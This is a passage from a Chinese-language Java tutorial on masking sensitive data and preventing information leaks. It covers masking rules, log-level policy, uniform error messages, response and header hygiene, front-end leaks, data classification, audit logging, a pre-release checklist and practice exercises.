    /** 各类敏感信息的脱敏规则：保留首尾，中间打码 */
    static String maskPhone(String s) {
        return s.replaceAll("(\\d{3})\\d{4}(\\d{4})", "$1****$2");
    }

    static String maskIdCard(String s) {
        return s.replaceAll("(\\d{6})\\d{8}(\\d{4})", "$1********$2");
    }

    static String maskBankCard(String s) {
        return s.replaceAll("(\\d{4})\\d{8,11}(\\d{4})", "$1********$2");
    }

    static String maskEmail(String s) {
        return s.replaceAll("([\\w.]{1,2})[\\w.]*(@[\\w.]+)", "$1***$2");
    }

    static String maskName(String s) {
        if (s.length() <= 1) {
            return s;
        }
        return s.charAt(0) + "*".repeat(s.length() - 1);
    }

    static String maskSecret(String s) {
        if (s.length() <= 8) {
            return "***";
        }
        return s.substring(0, 4) + "****" + s.substring(s.length() - 4);
    }

    record Desensitizer(Map<String, Function<String, String>> rules) {
        static Desensitizer defaultRules() {
            Map<String, Function<String, String>> m = new LinkedHashMap<>();
            m.put("phone", SensitiveDataMasking::maskPhone);
            m.put("idCard", SensitiveDataMasking::maskIdCard);
            m.put("bankCard", SensitiveDataMasking::maskBankCard);
            m.put("email", SensitiveDataMasking::maskEmail);
            m.put("name", SensitiveDataMasking::maskName);
            m.put("password", s -> "******");
            m.put("token", SensitiveDataMasking::maskSecret);
            return new Desensitizer(m);
        }

        String apply(String field, String value) {
            Function<String, String> f = rules.get(field);
            return f == null ? value : f.apply(value);
        }
    }

    /** 正则兜底：字段名未知时，按模式识别 */
    static final Pattern PHONE = Pattern.compile("1[3-9]\\d{9}");
    static final Pattern ID_CARD = Pattern.compile("\\d{17}[\\dXx]");
    static final Pattern EMAIL = Pattern.compile("[\\w.]+@[\\w.]+\\.\\w+");

    static String regexMask(String text) {
        // 顺序很重要：18 位身份证里含 11 位数字，先脱身份证再脱手机号，否则会被手机号规则切碎
        String out = ID_CARD.matcher(text).replaceAll("IDCARD_MASKED");
        out = EMAIL.matcher(out).replaceAll("EMAIL_MASKED");
        out = PHONE.matcher(out).replaceAll("PHONE_MASKED");
        return out;
    }

    static void whyItMatters() {
        System.out.println("【泄露不是来自攻击，多半来自「顺手」】");
        String[] leaks = {
                "log.info(\"user={} pwd={}\", name, password);",
                "e.printStackTrace() 直接写进 HTTP 响应体",
                "返回整个 User 实体，含 password_hash / salt",
                "Server: nginx/1.18.0 暴露中间件版本",
                "报错页显示完整 SQL 与表名",
                "把 access_token 拼在 URL 上，进了访问日志",
                "source map 未关闭，前端源码可直接读",
        };
        for (String s : leaks) {
            System.out.println("    " + s);
        }
        System.out.println("  每一条单看都不起眼，组合起来就是一次完整的信息收集");
        System.out.println();
    }

    static void maskingRules() {
        System.out.println("【脱敏：保留可识别性，去掉可滥用性】");
        Desensitizer d = Desensitizer.defaultRules();
        Map<String, String> sample = new LinkedHashMap<>();
        sample.put("phone", "13812345678");
        sample.put("idCard", "110101199003071234");
        sample.put("bankCard", "6222021234567890123");
        sample.put("email", "zhangsan@example.com");
        sample.put("name", "张三丰");
        sample.put("password", "S3cr3t!Pass");
        sample.put("token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9");
        System.out.println("  " + pad("字段", 12) + " | " + pad("原始", 34) + " | 脱敏后");
        sample.forEach((k, v) ->
                System.out.println("  " + pad(k, 12) + " | " + pad(v, 34) + " | " + d.apply(k, v)));
        System.out.println();
        System.out.println("  注意：后四位要保留 —— 客服常用后四位核对身份");
        System.out.println();
    }

    static void regexFallback() {
        System.out.println("【字段名未知时，用正则兜底】");
        String log = "订单 2024 提交，联系人 张三 13812345678，"
                + "身份证 110101199003071234，邮箱 zhangsan@example.com";
        System.out.println("  原始日志：" + log);
        System.out.println("  脱敏后  ：" + regexMask(log));
        System.out.println("  兜底能挡住「忘了标字段」的情况，但不能替代按字段脱敏");
        System.out.println();
    }

    static void logLayers() {
        System.out.println("【日志分层：不同级别给不同信息】");
        String[][] rows = {
                {"DEBUG", "完整参数（含敏感）", "仅本地/预发，需开关，禁止进集中式日志"},
                {"INFO", "关键业务事件，无敏感字段", "生产默认，可长期保留"},
                {"WARN", "异常但已处理，无敏感内容", "生产保留，看趋势"},
                {"ERROR", "错误码 + 请求ID + 类名行号", "生产保留，详情只在服务端"},
        };
        for (String[] r : rows) {
            System.out.println("  " + pad(r[0], 8) + " | " + pad(r[1], 28) + " | " + r[2]);
        }
        System.out.println();
        System.out.println("  兜底：日志框架层再加一层替换规则，防止有人漏写");
        System.out.println("    Logback: <replacing> 正则替换；Log4j2: PatternLayout 的 replace");
        System.out.println("  但兜底是「最后一道」，不是「唯一一道」");
        System.out.println();
    }

    static void errorHandling() {
        System.out.println("【错误信息：对外统一，对内详细】");
        Map<String, String> external = new LinkedHashMap<>();
        Map<String, String> internal = new LinkedHashMap<>();
        external.put("登录失败", "用户名或密码错误");
        internal.put("登录失败", "用户 zhangsan 密码哈希不匹配，来源 IP 10.2.3.4");
        external.put("查询失败", "系统繁忙，请稍后重试（请求ID: req-8f2a）");
        internal.put("查询失败", "SQLSyntaxError: SELECT * FROM orders WHERE id = ...");
        external.put("参数错误", "请求参数有误");
        internal.put("参数错误", "amount 必须为正数，收到 -5");
        System.out.println("  " + pad("场景", 10) + " | " + pad("返回给前端", 36) + " | 只进服务端日志");
        external.forEach((k, v) ->
                System.out.println("  " + pad(k, 10) + " | " + pad(v, 36) + " | " + internal.get(k)));
        System.out.println();
        System.out.println("  统一提示的另一目的：防用户枚举（不区分「用户不存在/密码错」）");
        System.out.println();
    }

    static void responseHygiene() {
        System.out.println("【响应体与响应头：能不发的就不发】");
        System.out.println("  错误做法：SELECT * 后把整个实体序列化");
        System.out.println("    {\"id\":1,\"name\":\"张三\",\"passwordHash\":\"$2a$12$...\",\"salt\":\"...\",\"internalNote\":\"VIP,勿催\"}");
        System.out.println("  正确做法：DTO 显式挑字段");
        System.out.println("    {\"id\":1,\"name\":\"张三\",\"phoneMasked\":\"138****5678\"}");
        System.out.println();
        System.out.println("  响应头要处理的：");
        String[] headers = {
                "Server: nginx/1.18.0  ->  改掉或去掉版本",
                "X-Powered-By: PHP/7.4  ->  关闭",
                "X-AspNet-Version  ->  关闭",
        };
        for (String h : headers) {
            System.out.println("    " + h);
        }
        System.out.println();
    }

    static void frontendLeaks() {
        System.out.println("【前端也是泄露面】");
        String html = "<input type=\"hidden\" name=\"role\" value=\"admin\">"
                + "<!-- TODO: 上线前删除测试账号 test/test123 -->";
        System.out.println("  页面里的隐患：" + html);
        System.out.println("    hidden 字段只是不显示，改一下就能提交 -> 权限必须服务端判");
        System.out.println("    HTML 注释、未使用的接口、source map、.git 目录都能被读");
        System.out.println("  打包时关 source map，清理注释，禁止提交 .env / .git");
        System.out.println();
    }

    static void dataClassification() {
        System.out.println("【数据分级与出口管控】");
        String[][] rows = {
                {"公开", "商品名、价格", "无限制"},
                {"内部", "库存、内部编号", "仅登录用户，不外发"},
                {"机密", "手机号、邮箱、地址", "脱敏后展示，传输加密"},
                {"绝密", "密码、身份证、银行卡、密钥", "不回显；存储加密/哈希；日志零出现"},
        };
        for (String[] r : rows) {
            System.out.println("  " + pad(r[0], 6) + " | " + pad(r[1], 26) + " | " + r[2]);
        }
        System.out.println();
        System.out.println("  规则：绝密级数据「默认不出现」，要用必须显式申请 + 审计");
        System.out.println();
    }

    static void auditTrail() {
        System.out.println("【审计日志：可追溯，本身也要保护】");
        List<String> events = List.of(
                "2026-11-17 09:12:03 user=1001 action=export_orders count=250 reqId=req-8f2a ip=10.2.3.4",
                "2026-11-17 09:15:41 user=1001 action=view_phone orderId=1002 reqId=req-9c1b ip=10.2.3.4");
        for (String e : events) {
            System.out.println("    " + e);
        }
        System.out.println("  内容：谁、何时、做什么、对哪条数据、来源 IP、请求 ID");
        System.out.println("  要求：只追加不可改、独立存储、访问受限、定期归档");
        System.out.println("  注意：审计日志里的手机号/身份证同样要脱敏");
        System.out.println();
    }

    static void reviewChecklist() {
        System.out.println("【上线前信息泄露自查】");
        String[] items = {
                "日志里 grep 不到明文手机号/身份证/密码/token",
                "异常统一处理，响应体不含栈与 SQL",
                "对外 DTO 不含敏感字段（对比表结构逐个核）",
                "响应头去掉了版本信息",
                "前端关闭 source map，无测试账号残留",
                "token 不放 URL，不进 Referer",
                "监控/APM/错误上报同样做了脱敏",
        };
        int i = 1;
        for (String s : items) {
            System.out.printf("  [ ] %d. %s%n", i++, s);
        }
        System.out.println();
    }

    static String pad(String s, int width) {
        int w = 0;
        for (int i = 0; i < s.length(); i++) {
            w += s.charAt(i) > 0x2E80 ? 2 : 1;
        }
        return s + " ".repeat(Math.max(width - w, 0));
    }

    public static void main(String[] args) {
        whyItMatters();
        maskingRules();
        regexFallback();
        logLayers();
        errorHandling();
        responseHygiene();
        frontendLeaks();
        dataClassification();
        auditTrail();
        reviewChecklist();
    }
}
```

**课后练习**
1. 给 `Desensitizer` 增加「地址脱敏」（保留到街道，门牌打码）和「银行卡 BIN 保留」规则，并说明各自为什么这样设计。
2. 写一个「日志安全断言」工具：给定一行日志，检测是否包含手机号/身份证/token 模式，命中则告警。
3. 把 `regexMask` 改成支持部分保留（如手机号保留后四位），并讨论正则脱敏的误伤与漏网场景。
4. 思考题：为什么脱敏要放在「输出前」而不是「输入时」？举一个输入时脱敏会破坏业务的例子。

---
